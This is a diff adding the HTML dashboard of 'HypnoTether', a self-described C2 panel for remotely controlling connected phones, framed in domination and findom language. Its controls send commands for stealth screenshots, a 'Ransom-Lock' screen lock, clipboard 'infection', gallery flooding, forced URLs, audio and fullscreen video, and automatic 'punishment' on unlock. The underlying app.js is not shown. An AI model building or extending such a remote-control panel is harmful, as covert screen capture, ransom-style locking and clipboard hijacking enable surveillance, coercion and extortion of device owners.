@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HypnoTether - Luxury C2</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="background-anim"></div>
+
+    <header class="glass-header">
+        <h1>Hypno<span class="accent">Tether</span> C2</h1>
+        <div class="status-indicator">
+            <span class="ping-dot"></span> Server Online
+        </div>
+    </header>
+
+    <main class="dashboard-container">
+        <!-- Sidebar: Attached Devices -->
+        <aside class="device-list glass-panel">
+            <h2>Connected Subjects</h2>
+            <ul id="device-ul">
+                <li class="empty-state">Waiting for connections...</li>
+            </ul>
+        </aside>
+
+        <!-- Main Control Area -->
+        <section class="control-center glass-panel">
+            <div class="top-bar">
+                <h2 id="selected-target-lbl">Target: <span class="accent">Global Broadcast</span></h2>
+                <button id="broadcast-btn" class="btn secondary">Select All</button>
+            </div>
+
+            <div class="modules-grid">
+                <!-- Command Module: Interruption -->
+                <div class="card">
+                    <h3>Disrupt</h3>
+                    <div class="btn-group">
+                        <button class="btn" onclick="sendCommand('vibrate', { duration: 1000 })">Vibrate</button>
+                        <button class="btn" onclick="sendCommand('flash_screen', { count: 3 })">Flash Screen</button>
+                        <button class="btn" onclick="sendCommand('lock_screen', null)">Lock Screen</button>
+                    </div>
+                </div>
+
+                 <!-- Command Module: Communication -->
+                 <div class="card">
+                    <h3>Communication</h3>
+                    <input type="text" id="notif-input" placeholder="Enter message here...">
+                    <div class="btn-group">
+                        <button class="btn primary" onclick="sendNotif()">Push Notification</button>
+                        <button class="btn" onclick="sendOverlayText()">Overlay Text</button>
+                    </div>
+                    <button class="btn danger full-width" style="margin-top:10px" onclick="sendCommand('open_chat', null)">Force Chat Window</button>
+                </div>
+
+                <!-- Command Module: Media Upload & Fire -->
+                <div class="card span-2">
+                    <h3>Media Injection</h3>
+                    <div class="upload-area">
+                        <input type="file" id="mediaUpload" accept="image/*,video/*,audio/*" />
+                        <button class="btn primary" onclick="uploadAndFire()">Upload & Blast Target</button>
+                    </div>
+                    <div class="btn-group" style="margin-top: 15px;">
+                        <button class="btn" onclick="sendCommand('change_wallpaper', { url: window.lastUploadedMedia })">Set Wallpaper</button>
+                        <button class="btn" onclick="sendCommand('play_audio', { url: window.lastUploadedMedia })">Play Audio in BG</button>
+                        <button class="btn danger" onclick="sendCommand('stop_audio', null)">Halt Audio</button>
+                    </div>
+                    <div class="btn-group" style="margin-top: 10px;">
+                        <button class="btn danger full-width" onclick="sendCommand('spiral_video', { url: window.lastUploadedMedia })">Force Fullscreen Spiral</button>
+                        <button class="btn" onclick="sendCommand('flood_gallery', { url: window.lastUploadedMedia })">Flood Android Gallery</button>
+                    </div>
+                </div>
+
+                <!-- Command Module: System Management -->
+                <div class="card">
+                    <h3>System Control</h3>
+                    <input type="text" id="url-input" placeholder="https://throne.com/..." style="margin-bottom: 5px;">
+                    <button class="btn full-width" onclick="sendCommand('open_url', { url: document.getElementById('url-input').value })">Force Open URL</button>
+                    
+                    <input type="text" id="clip-input" placeholder="Obeisance text..." style="margin-top: 15px; margin-bottom: 5px;">
+                    <button class="btn secondary full-width" onclick="sendCommand('infect_clipboard', { text: document.getElementById('clip-input').value })">Infect Clipboard</button>
+                    
+                    <hr class="separator"/>
+                    
+                    <button class="btn full-width" onclick="sendCommand('take_screenshot', null)">Capture Screen (Stealth)</button>
+                    
+                    <div class="btn-group" style="margin-top: 10px;">
+                        <button class="btn danger full-width" onclick="sendCommand('lock_screen', null)">Engage Ransom-Lock</button>
+                        <button class="btn full-width" style="background: rgba(0,255,100,0.2)" onclick="sendCommand('unlock_screen', null)">Release Lock</button>
+                    </div>
+                </div>
+                
+                <!-- Command Module: Restriction -->
+                <div class="card">
+                    <h3>Parental Restrictions</h3>
+                    <label class="toggle-container">
+                        <input type="checkbox" id="block-apps-toggle" onchange="toggleAppBlock()">
+                        <span class="checkmark"></span>
+                        Enable Social Media Block
+                    </label>
+                    <label class="toggle-container">
+                        <input type="checkbox" id="punish-mode" onchange="togglePunish()">
+                        <span class="checkmark"></span>
+                        Auto-Punish on Unlock
+                    </label>
+                </div>
+            </div> <!-- End modules grid upper -->
+
+            <!-- Live Chat Module -->
+            <div class="card" style="margin-top: 20px;">
+                <h3>Live Tether Chat</h3>
+                <div id="chat-window" style="height: 200px; background: rgba(0,0,0,0.5); border: 1px solid var(--glass-border); border-radius: 6px; overflow-y: auto; padding: 10px; margin-bottom: 15px; font-size: 0.9em; display: flex; flex-direction: column; gap: 8px;">
+                    <div style="color: var(--text-muted); text-align: center; margin-top: auto; margin-bottom: auto;">Select a target and start typing to initialize the chat override.</div>
+                </div>
+                <div style="display: flex; gap: 10px;">
+                    <input type="text" id="chat-input" placeholder="Dominatrix commands..." style="margin-bottom: 0;">
+                    <button class="btn primary" onclick="sendChatMessage()">Send to Sub</button>
+                    <button class="btn danger" onclick="sendCommand('close_chat', null)">Force Close</button>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
